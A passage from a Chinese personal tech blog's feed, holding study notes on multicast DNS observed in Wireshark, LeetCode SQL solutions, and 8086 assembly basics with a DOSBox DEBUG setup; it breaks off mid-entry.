    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;本文主要根据 &lt;a href=&quot;https://doc.rust-lang.org/book/&quot;&gt;The Rust Programming Language&lt;/a&gt; 翻译总结而成，大多内容纯粹是对该书的翻译，但按照我个人的学习路线以及练习增删了一些内容，同时也参考了其他文档对需要深入讨论或是难以理解的部分进行了详细介绍，&lt;strong&gt;因此对于本文内容请不要认为其等同于原文&lt;/strong&gt;。本文对于&lt;strong&gt;有其他编程语言经验&lt;/strong&gt;的同学来说比较容易接受，容易引起歧义的英文翻译都会标注原文。由于本文完全直接参考官方教程等英文文献，可以确保内容不存在由于转经多人之手而出现的偏差。但受限于个人知识水平，难免出现疏漏错误，烦请告知。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="PL" scheme="https://blog.secriy.com/tags/PL/"/>
    
    <category term="Rust" scheme="https://blog.secriy.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>Multicast DNS</title>
    <link href="https://blog.secriy.com/multicast-dns/"/>
    <id>https://blog.secriy.com/multicast-dns/</id>
    <published>2021-08-16T14:38:29.000Z</published>
    <updated>2025-02-16T07:13:36.773Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>玩 Wireshark 的时候无意中发现了一个叫 mDNS 的协议，有些好奇就打算深入了解一下。</p></div><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>multicast DNS (mDNS)</strong> 协议，即多播 DNS 协议，顾名思义和 DNS 有相似之处。当局域网内没有传统的 DNS 服务器时，使用 mDNS 可以让局域网内的主机相互发现。</p><p>mDNS 使用的端口为 5353 端口，遵从 DNS 协议。</p><h3 id="多播（multicast）"><a href="#多播（multicast）" class="headerlink" title="多播（multicast）"></a>多播（multicast）</h3><p><strong>多播</strong>又叫组播，区别于<strong>广播</strong>，它只会将数据发送给指定的<strong>多播组</strong>，更不是点对点的<strong>单播</strong>。多播优于广播的地方之一是它更加节省网络带宽。</p><p>IP 多播通信依赖于 IP 多播地址，在 IPv4 中它属于 D 类地址，范围从 224.0.0.0 到 239.255.255.255，并被划分为<strong>局部链接多播地址</strong>（224.0.0.0 ~ 224.0.0.255）、<strong>预留多播地址</strong>（224.0.1.0 ~ 238.255.255.255）以及<strong>管理权限多播地址</strong>（239.0.0.0 ~ 239.255.255.255）。</p><p>局部链接多播地址为路由协议和其他用途保留，路由器不会转发该范围内的 IP 报文；预留多播地址可以用于全球范围或者网络协议；管理权限多播地址供组织内部使用，不能用于互联网，可以限制多播范围。</p><p>多播组就是使用同一个 IP 多播地址接收数据报的主机，多播组成员可以随时加入和离开，并且数量不受限制，一台主机也可以属于多个多播组。不属于该多播组的主机同样可以给这个多播组发数据报。</p><p>mDNS 使用的多播地址是 224.0.0.251，属于局部链接多播地址。它使用的 IPv6 地址为 ff02::fb。</p><h3 id="为什么要有-mDNS？"><a href="#为什么要有-mDNS？" class="headerlink" title="为什么要有 mDNS？"></a>为什么要有 mDNS？</h3><p>在局域网内，我们和其他主机直接交换数据是通过 MAC 地址，在上层则是由 IP 地址来查找，二者可能在本机的 ARP 缓存中找到。但当 ARP 缓存中没有这两个东西该怎么办呢？由于 DHCP 的使用，对方的 IP 地址可能不固定，因此无法保证由 IP 地址找到目标主机。通过 MAC 地址来寻找似乎可行，因为大部分情况下 MAC 地址是固定的，然而这里有个问题：如果我要使用链路层之上的协议，那我就必须要有 IP 地址，除非直接通过链路层发送数据。无论如何，我们都需要对方的 IP 地址，而 mDNS 就是用于寻找指定设备的 IP 地址的。用什么找呢？答案是主机名。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>如果一台主机开启了 mDNS 服务，那么当它进入某一局域网时会向局域网内所有的主机发送一条组播消息，在 Wireshark 中可以看到这个消息的信息：</p><p><img src="/multicast-dns/image-20210816234739410.png" class="lazyload" data-srcset="/multicast-dns/image-20210816234739410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210816234739410"></p><p>可以看到 mDNS 下层是 UDP，提供尽最大努力交付。继续看它的报文内容：</p><p><img src="/multicast-dns/image-20210816234903561.png" class="lazyload" data-srcset="/multicast-dns/image-20210816234903561.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210816234903561"></p><p>其中有个 Questions 字段为 5，即对应 Queries 有 5 条。</p><p>这里解释下里面的一些字段和词汇：</p><ul><li>QU：单播。</li><li>QM：多播。</li><li>A 记录：主机名 - IPv4。</li><li>AAAA 记录：主机名 - IPv6。</li><li>PTR 记录：标识服务实例名称和服务类型之间的关系。</li><li>SRV 记录：标识服务实例名称对应的主机名和端口号。</li><li>TXT 记录：对某个服务实例提供的附加信息，按照 Key/Value 对提供。</li><li>ANY 记录：任意类型，一般用于查询。</li></ul><p>可以看到局域网内的主机名用 <code>.local</code> 将其与网络主机域名区分开，从这些名字（比如 homekit）里可以看出，这是一台在查找局域网内 HomeKit 设备的主机（没错就是我的 iPad）。另外上面还有 <code>_tcp</code>、<code>_udp</code> 等标识服务所使用协议的字段。</p><p>这是 mDNS 的第一个查询请求，它还会有一个对应的应答请求：</p><p><img src="/multicast-dns/image-20210817001748932.png" class="lazyload" data-srcset="/multicast-dns/image-20210817001748932.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210817001748932"></p><p>从图中可以看到发送方的主机名：<code>Secriys-iPad.local</code>，接下来就可以试着访问它。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>尝试通过 <code>ping</code> 命令发现该设备：</p><p><img src="/multicast-dns/image-20210817002419961.png" class="lazyload" data-srcset="/multicast-dns/image-20210817002419961.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210817002419961"></p><p>可以看到直接找到了对方的 IP 地址，也就是说通过这种方式就可以很方便的查找局域网中的设备了。可以想到的用途如在内网部署了一个 IP 不固定的树莓派，用它的主机名去找到它之上部署的服务。</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li>补全文章理论的实现细节。</li></ul>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;玩 Wireshark 的时候无意中发现了一个叫 mDNS 的协议，有些好奇就打算深入了解一下。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="技术讨论" scheme="https://blog.secriy.com/categories/tech/"/>
    
    
    <category term="Network" scheme="https://blog.secriy.com/tags/Network/"/>
    
    <category term="Protocol" scheme="https://blog.secriy.com/tags/Protocol/"/>
    
  </entry>
  
  <entry>
    <title>SQL Practice</title>
    <link href="https://blog.secriy.com/sql-practice/"/>
    <id>https://blog.secriy.com/sql-practice/</id>
    <published>2021-08-16T03:22:11.000Z</published>
    <updated>2025-02-16T07:13:36.782Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>SQL 刷题练习。</p></div><span id="more"></span><h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><h3 id="175-组合两个表"><a href="#175-组合两个表" class="headerlink" title="175. 组合两个表"></a><a href="https://leetcode-cn.com/problems/combine-two-tables/">175. 组合两个表</a></h3><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><pre><code class="sql">select FirstName, LastName, City, Statefrom Personleft join Address using (PersonId);</code></pre><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ul><li>内连接（inner join）<br><img src="/sql-practice/l.png" class="lazyload" data-srcset="/sql-practice/l.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="inner-join"></li><li>左连接（left join）<br><img src="/sql-practice/l.png" class="lazyload" data-srcset="/sql-practice/l.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="left-outer-join"></li><li>右连接（right join）<br><img src="/sql-practice/l.png" class="lazyload" data-srcset="/sql-practice/l.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="right-outer-join"></li><li>全连接（full outer join）<br><img src="/sql-practice/l.png" class="lazyload" data-srcset="/sql-practice/l.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="full-outer-join"></li><li>using<br>通过其后的列名来连接，等同于<code>where A.XXX = B.XXX</code></li></ul><h3 id="176-第二高的薪水"><a href="#176-第二高的薪水" class="headerlink" title="176. 第二高的薪水"></a><a href="https://leetcode-cn.com/problems/second-highest-salary/">176. 第二高的薪水</a></h3><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><pre><code class="sql">select (    select distinct Salary    from Employee    order by Salary desc    limit 1,1) as SecondHighestSalary;</code></pre><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><ul><li><p>distinct<br>指定列重复的记录中只保留第一个记录</p></li><li><p>order by<br>排序</p></li><li><p>desc<br>降序</p></li><li><p>limit &amp; offset<br><code>limit 2 offset 1</code> 指从第二个记录开始的一个记录，即第二个记录和第三个记录</p><p>MySQL 中可以使用短形式：<code>limit 1,2</code>，同上</p></li><li><p>as<br>给查询的列指定别名</p></li></ul><h3 id="177-第-N-高的薪水"><a href="#177-第-N-高的薪水" class="headerlink" title="177. 第 N 高的薪水"></a><a href="https://leetcode-cn.com/problems/nth-highest-salary/">177. 第 N 高的薪水</a></h3><h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><pre><code class="sql">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGINset N = N - 1;  RETURN (      select (          select distinct salary          from Employee          order by salary desc          limit N,1      ) as getNthHighestSalary  );END</code></pre><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><ul><li>function</li><li>limit 中不能改变变量，因此需要先<code>set N = N - 1</code></li></ul><h3 id="178-分数排名"><a href="#178-分数排名" class="headerlink" title="178. 分数排名"></a><a href="https://leetcode-cn.com/problems/rank-scores/">178. 分数排名</a></h3><h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><pre><code class="sql">select Score,dense_rank() over(order by Score desc) as &#39;Rank&#39;from Scores;</code></pre><pre><code class="sql">select s1.Score, count(distinct(s2.Score)) as &#39;Rank&#39;from Scores s1, scores s2where s1.Score &lt;= s2.Scoregroup by s1.Idorder by `Rank`</code></pre><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><ul><li>MySQL 内置 <code>dense_rank()</code>用于计算排名，且排名连续</li><li><code>rank()</code>与<code>dense_rank()</code>的差别在于前者排名不连续，重复值会占用数字</li><li><code>row_number()</code> 会将每个记录依次设置序号，适用于分页</li><li><code>ntile(N)</code>将记录分为 N 个桶，序号从 1-N</li><li>SQL 的执行顺序为 from where select</li></ul>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;SQL 刷题练习。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Database" scheme="https://blog.secriy.com/tags/Database/"/>
    
    <category term="SQL" scheme="https://blog.secriy.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Assembly Language</title>
    <link href="https://blog.secriy.com/assembly-language/"/>
    <id>https://blog.secriy.com/assembly-language/</id>
    <published>2021-08-15T03:22:26.000Z</published>
    <updated>2025-02-16T07:13:36.733Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>汇编语言的学习笔记，主要是对《汇编语言》（王爽）的总结、概括、补充以及实践。</p></div><span id="more"></span><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h3><p>机器语言是机器指令的集合，以二进制表示，每一种 CPU 都有自己的机器指令集，机器指令指定 CPU 进行特定的任务。</p><h3 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h3><p>机器指令全部由二进制编写，人类难以编写和调试，因此汇编语言出现了。汇编程序通过编译器生成对应的机器码，由 CPU 进行执行。例如汇编指令 <code>MOV AX, BX</code> 编译生成的机器码为 <code>1000100111011000</code>（8086 CPU）。</p><p>汇编语言由以下三个部分组成：</p><ol><li>汇编指令，如 <code>MOV</code>，是机器指令的助记符，和机器指令一一对应；</li><li>伪指令，没有对应的机器码，编译器对其进行处理，计算机并不执行；</li><li>其他符号，如 <code>+ - * /</code> 等，由编译器识别，没有对应的机器码。</li></ol><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>向 CPU 提供的程序指令以及数据都由存储器保存，需要时调入 CPU 执行，这里的存储器即内存。</p><blockquote><p>指令和数据在内存或磁盘上并没有差别，都是一串二进制信息，同样的一串二进制数位如 <code>1000100111011000</code> 可以被看作是指令 <code>MOV AX, BX</code> 也可以被看作是数据 <code>89D8H</code>。CPU 会按照特定机制把信息看作是指令或是数据，比如在不同的 CPU 指令周期把信息认作不同的类型。</p></blockquote><h4 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h4><p>存储器被抽象为线性的若干个单元，从 0 开始编号，如存储器有 128 个存储单元，编号从 0 ~ 127。每个存储单元大小为 8 bits 即 1 byte。</p><h4 id="CPU-读写存储器"><a href="#CPU-读写存储器" class="headerlink" title="CPU 读写存储器"></a>CPU 读写存储器</h4><p>CPU 需要通过以下三种信息来进行存储器上的数据读写：</p><ul><li><p>存储单元的地址（地址信息）。</p></li><li><p>芯片或器件的选择，读或写的命令（控制信息）。</p></li><li><p>读或写的数据（数据信息）。</p></li></ul><p>步骤如下：</p><ol><li>CPU 通过<strong>地址线</strong>将地址信息（如指定存储器 3 号单元）发出。</li><li>CPU 通过<strong>控制线</strong>发出内存读命令，并选中需要用到的存储器。</li><li>存储器将 3 好单元内的数据通过<strong>数据线</strong>送入 CPU。</li></ol><h3 id="三类总线"><a href="#三类总线" class="headerlink" title="三类总线"></a>三类总线</h3><h4 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h4><p>一根地址线可以表示 0、1 两个状态，因此可以寻 0、1 两个地址，10 根地址线可以寻址 $2^{10}$ 即 1024 个地址（0 ~ 1023）。</p><p>地址总线的宽度决定了 CPU 的寻址空间大小。</p><h4 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h4><p>单根数据线可以一次传送 1 bit 的信息，8 根数据线可以一次传送 8 bits 的数据。8086 CPU 有 16 根地址线，可以一次传送 16 位数据，即 2 bytes。读超过数据总线宽度的数据时需要多次读取。</p><p>数据总线的宽度决定了 CPU 单次能传输的数据量。</p><h4 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h4><p>单根控制线提供了对外部部件的某一控制信息，如“读信号输出”控制线负责向外界传递读信号。</p><p>控制总线的宽度决定了 CPU 对其他器件的控制能力。</p><h3 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h3><p>不同的设备提供了不同的硬件适配器（即接口卡），如网卡的网络适配器、显卡的显示控制器等，计算机要通过给硬件适配器传送命令来完成一系列操作。通常硬件适配器上会有一个存储空间来暂存数据，如显卡的显存用来临时存放将要显示的数据。这些设备的存储器都需要分配地址。</p><p>CPU 将分布在不同硬件上的各类物理存储器看作是一个逻辑存储器的一部分，也就是说在 CPU 眼里这些存储器组成了一个线性的存储器（内存地址空间）。比如让内存条占用内存地址空间的 0 ~ 1023 地址，让显存占用 1024 ~ 1151 地址。想对显存读写的时候 CPU 可以直接指定 1024 ~ 1151 地址区间。</p><p>地址空间的大小取决于 CPU 的寻址能力，即地址总线的宽度。比如 32 位系统环境下，我们知道其可寻址的地址空间大小为 $2^{32}$ 即 4294967296 bytes，但它实际能给我们最常见的内存条分配的地址空间并非这么多，显存、网卡等都要占据一部分地址空间。事实上，32 位 Windows 7/8 系统支持的最大内存只有 3.25GB 左右。</p><p>理论上 64 位系统环境下，可使用的地址空间高达 16777216TB，但由于很多 64 位 CPU 使用 40 位地址线，导致其最终地址空间大小只有 1TB。而操作系统和主板的限制让这个大小实际上远没有那么多。</p><p>在 Windows 操作系统上，可以使用命令 <code>wmic memphysical get maxcapacity</code> 查看设备支持的最大内存条容量（单位：KB）：</p><p><img src="/assembly-language/image-20210818103605210.png" class="lazyload" data-srcset="/assembly-language/image-20210818103605210.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818103605210"></p><p>在我的设备上，最高也就只有 64GB，这受限于主板能够提供的内存条插槽数，如主板支持单根 32GB，那么双插槽就支持 64GB。</p><p>如何直观地了解什么是内存地址空间？显存在哪里？在 Windows 操作系统上，可以打开设备管理器查看：</p><p><img src="/assembly-language/image-20210818104505616.png" class="lazyload" data-srcset="/assembly-language/image-20210818104505616.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818104505616"></p><p>可以看到如 SATA 控制器、显卡、NVMe 控制器、网络适配器等设备都会被分配地址空间资源。因此我们知道，通过同一套内存地址，我们能够访问所有的这些存储器。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>CPU 从内存中读取指令和数据然后对其进行处理，因此 CPU 内部还需要暂存这些指令和数据，由寄存器完成这项任务。</p><p>CPU 的组成：</p><ul><li>运算器，负责进行运算。</li><li>寄存器，负责存储信息。</li><li>控制器，控制各种器件工作。</li><li>内部总线，负责连接各部件，在其中传送数据。</li></ul><p>8086 CPU 中的寄存器（14 个）：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>上述 8086 CPU 的寄存器中，AX、BX、CX、DX 为通用寄存器，用于存放一般性的数据。其存储大小皆为 16 bits。</p><p>8086 CPU 为了兼容为上代 8 位寄存器的 CPU 编写的程序，每个通用寄存器可以分为两个 8-bit 寄存器使用：</p><ul><li>AX 可以分为 AH 和 AL。</li><li>BX 可以分为 BH 和 BL。</li><li>CX 可以分为 CH 和 CL。</li><li>DX 可以分为 DH 和 DL。</li></ul><h3 id="字在寄存器中的存储"><a href="#字在寄存器中的存储" class="headerlink" title="字在寄存器中的存储"></a>字在寄存器中的存储</h3><p>对于 8086 CPU，它可以一次性处理以下两种数据：</p><ul><li>字节（byte），8 bits。</li><li>字（word），16 bits。</li></ul><p>一个字由两个字节组成，分别称为高位字节和低位字节，字可以正好存在一个通用寄存器中。</p><h3 id="指令示例"><a href="#指令示例" class="headerlink" title="指令示例"></a>指令示例</h3><table><thead><tr><th align="center">汇编指令</th><th align="center">操作</th></tr></thead><tbody><tr><td align="center">MOV AX, 4E20H</td><td align="center">将 4E20H 送入寄存器 AX</td></tr><tr><td align="center">MOV AX, BX</td><td align="center">将寄存器 BX 的内容送入寄存器 AX</td></tr><tr><td align="center">ADD AX, 1406H</td><td align="center">将 AX 的内容加上 1406H</td></tr><tr><td align="center">ADD AX, BX</td><td align="center">将 AX 的内容加上 BX 的内容，存储在 AX 中</td></tr></tbody></table><p>指令的两个数据对象必须位数一致。16 位寄存器只能存 16 位数据，如操作 ADD 指令后超出 16 位，则只保留低 16 位在寄存器中。直接操作 AL 溢出后并不能将溢出值放入 AH 中，和 16 位一样只保留低 8 位。</p><h3 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h3><p>对于 16 位 CPU（如 8086）：</p><ul><li>运算器一次最多处理 16 位数据。</li><li>寄存器最大宽度为 16 位。</li><li>寄存器与运算器之间的通路为 16 位。</li></ul><p>8086 CPU 有 20 根地址总线，内存单元物理地址需要用 20 bits 存储，但它是 16 位 CPU，因此需要两个寄存器来保存一个地址。</p><p>第一个寄存器提供段地址，第二个寄存器提供偏移地址，最终通过 <code>[物理地址] = [段地址] * 16 + [偏移地址]</code> 来计算出实际的物理地址，如：</p><ul><li><p>段地址 <code>1000H</code>，偏移地址 <code>124AH</code>，得出物理地址 <code>1124AH</code>。</p></li><li><p>段地址 <code>1230H</code>，偏移地址 <code>00C8H</code>，得出物理地址 <code>123C8H</code>。</p></li></ul><p>对段地址（16 进制表示）乘以 16 实质是左移一位。<code>1000H</code> 左移一位即 <code>10000H</code>。</p><p>不同的段地址和偏移地址能够得到相同的物理地址。</p><p>段地址实际上是 CPU 对内存的抽象划分，内存本身并没有段的概念，由于偏移地址由 16 位存储，即可以表示 64KB 大小的地址空间，因此一个段的最大容量为 64KB。也就是说给定一个段地址，无法寻址到从它开始 64KB 以外的内存单元。</p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>8086 CPU 有四个段寄存器：CS、DS、SS、ES。</p><p>这些段寄存器用来存放段地址。</p><h3 id="CS-和-IP"><a href="#CS-和-IP" class="headerlink" title="CS 和 IP"></a>CS 和 IP</h3><p>IP 是一个指令指针寄存器，即用于存放内存物理地址的偏移，通过 CS 和 IP 中的内容就可以生成一个物理地址。</p><p>如 CS（<code>2000H</code>），IP（<code>0000H</code>），由地址加法器计算出物理地址为 <code>20000H</code>，通过地址总线寻址，由数据总线将其中的指令和数据调入 CPU 执行。这期间 IP 中的偏移位会增加，指向下一个内存中的指令地址。8086 CPU 刚启动时 CS 和 IP 的默认值分别为 <code>FFFFH</code> 和 <code>0000H</code>，即初始从 <code>FFFF0H</code> 取指执行。CPU 通过 <code>CS:IP</code> 指定的物理地址来确定一个内存中的信息是否是指令，<code>CS:IP</code> 指向的内存单元内容被 CPU 看作是指令。</p><p>要想修改 CS 和 IP 的内容无法通过 MOV 指令完成，可以通过 JMP 指令（JMP [段地址]:[偏移地址]）来操作：</p><pre><code class="assembly">JMP 2AE3:3JMP 3:0B16</code></pre><p>执行后 CS 和 IP 的值会被修改为指定的值。</p><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><p>通过段的抽象，可以将指令都放在指定的一些内存连续的段中，被称为代码段，这种方式能够让指令聚集在连续的内存单元中，方便管理和隔离。</p><h2 id="DEBUG-程序实验"><a href="#DEBUG-程序实验" class="headerlink" title="DEBUG 程序实验"></a>DEBUG 程序实验</h2><p>可以通过 DOSBox 来模拟 DOS 环境，在其下进行实验。</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><ol><li>下载安装 <a href="https://www.dosbox.com/download.php?main=1">DOSBox</a>。</li><li>下载 <a href="https://upyun.secriy.com/downloads/DEBUG.zip"><em>DEBUG.zip</em></a> 解压到固定目录，如 DOSBox 安装目录下。</li><li>打开 DOSBox，执行 <code>mount x path_to\DOSBox</code>，将 DOSBox 目录挂载到 <code>x</code> 盘符。</li><li>执行 <code>X:</code>，切换到 <code>x</code> 盘符下。</li><li>执行 <code>cd path_to</code> 来切换到 <em>DEBUG.zip</em> 的解压路径，如 <code>cd DEBUG</code>。</li></ol><p><img src="/assembly-language/image-20210815130257882.png" class="lazyload" data-srcset="/assembly-language/image-20210815130257882.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815130257882"></p><h3 id="DEBUG-常用命令"><a href="#DEBUG-常用命令" class="headerlink" title="DEBUG 常用命令"></a>DEBUG 常用命令</h3><ul><li>R，查看、改变 CPU 寄存器中的内容。</li><li>D，查看内存中的内容。</li><li>E，改写内存中的内容。</li><li>U，将内存中的机器指令翻译成汇编。</li><li>T，执行一条机器指令。</li><li>A，以汇编格式在内存中写入一条机器指令。</li></ul><h4 id="R"><a href="#R" class="headerlink" title="R"></a>R</h4><p><img src="/assembly-language/image-20210818084048619.png" class="lazyload" data-srcset="/assembly-language/image-20210818084048619.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818084048619"></p><p>如上图，R 命令可以查看 13 个寄存器的内容，其中 <code>073F:0100</code> 即为 <code>CS:IP</code> 所指向的内存单元，其内容为 <code>0000</code>，后面的 <code>ADD [BX+SI],AL</code> 则是 <code>0000</code> 对应的汇编指令，当该内存单元内容被填充为全零时，就会被反汇编为该指令，实际无意义。</p><p>R 命令还可以用于修改某一寄存器的内容：</p><p><img src="/assembly-language/image-20210818084426943.png" class="lazyload" data-srcset="/assembly-language/image-20210818084426943.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818084426943"></p><p>同样地，可以用来修改 CS、IP 的内容，让其执向另一个内存单元。</p><h4 id="D"><a href="#D" class="headerlink" title="D"></a>D</h4><p>D 命令可以用于查看 <code>CS:IP</code> 所指向内存单元及其后的一段连续单元（128 个单元）：</p><p><img src="/assembly-language/image-20210818090443993.png" class="lazyload" data-srcset="/assembly-language/image-20210818090443993.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 